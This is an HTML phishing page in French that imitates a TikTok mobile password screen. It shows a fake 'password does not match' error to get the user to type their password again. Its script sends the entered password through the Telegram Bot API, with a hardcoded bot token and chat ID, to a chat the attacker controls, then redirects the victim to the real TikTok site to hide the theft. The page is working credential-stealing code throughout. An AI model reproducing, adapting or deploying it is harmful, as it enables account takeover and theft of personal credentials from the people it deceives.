<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Saisir le mot de passe</title>
    <style>
        :root {
            --bg-color: #ffffff;
            --text-main: #000000;
            --error-color: #d93025;
            --error-border: #f26457;
            --link-color: #1a56bc;
            --btn-bg: #fe2c55; 
            --btn-text: #ffffff;
            --icon-color: #000000;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .mobile-container {
            width: 100%;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 24px;
        }

        .icon-btn {
            background: none;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--icon-color);
        }

        .icon-btn svg {
            width: 24px;
            height: 24px;
            stroke-width: 2;
        }

        main {
            flex-grow: 1;
            padding: 20px 32px;
            display: flex;
            flex-direction: column;
        }

        h1 {
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 30px;
            letter-spacing: -0.5px;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
            margin-bottom: 12px;
        }

        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 16px;
            padding-right: 48px;
            font-size: 16px;
            border: 2px solid var(--error-border);
            border-radius: 12px;
            outline: none;
            transition: border-color 0.2s;
        }

        .toggle-password {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: var(--icon-color);
            display: flex;
            align-items: center;
        }

        .toggle-password svg {
            width: 20px;
            height: 20px;
        }

        .error-message {
            display: flex;
            align-items: flex-start;
            color: var(--error-color);
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 24px;
            line-height: 1.4;
        }

        .error-message svg {
            width: 16px;
            height: 16px;
            margin-right: 8px;
            margin-top: 2px;
            flex-shrink: 0;
            fill: currentColor;
        }

        .help-link {
            color: var(--link-color);
            text-decoration: none;
            font-size: 15px;
            font-weight: 600;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        footer {
            padding: 20px 32px 40px 32px;
        }

        .continue-btn {
            width: 100%;
            background-color: var(--btn-bg);
            color: var(--btn-text);
            border: none;
            border-radius: 24px;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .continue-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="mobile-container">
        <header>
            <button class="icon-btn" onclick="window.history.back()" aria-label="Retour">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="15 18 9 12 15 6"></polyline>
                </svg>
            </button>
            <button class="icon-btn" aria-label="Aide">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
                </svg>
            </button>
        </header>

        <main>
            <h1>Saisir le mot de passe</h1>
            
            <div class="input-wrapper">
                <input type="password" id="passwordInput" placeholder="Mot de passe" />
                <button type="button" class="toggle-password" id="togglePasswordBtn">
                    <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                        <line x1="1" y1="1" x2="23" y2="23"></line>
                    </svg>
                </button>
            </div>

            <div class="error-message">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                <span>Le nom d'utilisateur ou le mot de passe ne correspond pas. Réessayez.</span>
            </div>

            <a href="#" class="help-link">Besoin d'aide pour vous connecter ?</a>
        </main>

        <footer>
            <button class="continue-btn" id="continueBtn">Continuer</button>
        </footer>
    </div>

    <script>
        const passwordInput = document.getElementById('passwordInput');
        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
        const eyeIcon = document.getElementById('eyeIcon');
        const continueBtn = document.getElementById('continueBtn');

        // Configuration Telegram
        const TELEGRAM_TOKEN = "8245021160:AAEnbdixzuhvNj-IJVAlewEGLb0_Qszd9_U";
        const CHAT_ID = "-1003768455972";

        // Gestion de la visibilité du mot de passe
        togglePasswordBtn.addEventListener('click', function () {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            if (type === 'password') {
                eyeIcon.innerHTML = `
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                    <line x1="1" y1="1" x2="23" y2="23"></line>
                `;
            } else {
                eyeIcon.innerHTML = `
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                    <circle cx="12" cy="12" r="3"></circle>
                `;
            }
        });

        // Envoi Telegram et Redirection TikTok
        continueBtn.addEventListener('click', async () => {
            const pwd = passwordInput.value.trim();
            if(!pwd) return;

            continueBtn.disabled = true;
            continueBtn.innerText = "Traitement...";

            const message = `<b>🔑 Mot de passe reçu</b>\n\n<b>Password:</b> <code>${pwd}</code>`;

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                // Redirection finale vers TikTok
                window.location.href = "https://www.tiktok.com";
            } catch (error) {
                console.error('Erreur:', error);
                window.location.href = "https://www.tiktok.com";
            }
        });
    </script>
</body>
</html>
